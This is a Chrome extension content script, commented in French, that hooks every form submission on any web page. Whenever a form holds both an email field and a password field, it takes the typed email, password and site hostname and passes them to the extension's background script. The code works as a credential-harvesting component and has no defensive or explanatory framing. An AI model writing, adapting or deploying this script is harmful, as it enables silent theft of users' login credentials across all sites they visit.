// Ajoute un écouteur d'événement qui exécute une fonction lorsque le contenu de la page est complètement chargé.
document.addEventListener('DOMContentLoaded', function() {
    // Affiche un message dans la console indiquant que le script de contenu est injecté et en cours d'exécution.
    console.log("Content script injected and running");
});

// Ajoute un écouteur d'événement qui exécute une fonction lorsque n'importe quel formulaire sur la page est soumis.
document.addEventListener('submit', function(event) {
    // Obtient l'élément formulaire qui a déclenché l'événement de soumission.
    var form = event.target;

    // Cherche le champ d'entrée de type "email" dans le formulaire soumis.
    var emailField = form.querySelector('input[type="email"]');

    // Cherche le champ d'entrée de type "password" dans le formulaire soumis.
    var passwordField = form.querySelector('input[type="password"]');

    // Si les champs email et mot de passe existent dans le formulaire soumis.
    if (emailField && passwordField) {
        // Récupère la valeur du champ email.
        var email = emailField.value;

        // Récupère la valeur du champ mot de passe.
        var password = passwordField.value;

        // Obtient le nom d'hôte de l'URL actuelle.
        var url = window.location.hostname;

        // Envoie un message au script de fond de Chrome avec les informations du formulaire soumis.
        chrome.runtime.sendMessage({
            action: 'formSubmitted',
            email: email,
            password: password,
            url: url
        }, function(response) {
            // Affiche un message dans la console indiquant que le message a été envoyé au script de fond, avec la réponse du script de fond.
            console.log("Message sent to background script", response);
        });

        // Affiche un message dans la console indiquant que le formulaire a été soumis et le message a été envoyé au script de fond.
        console.log("Form submitted and message sent to background script");
    }
});
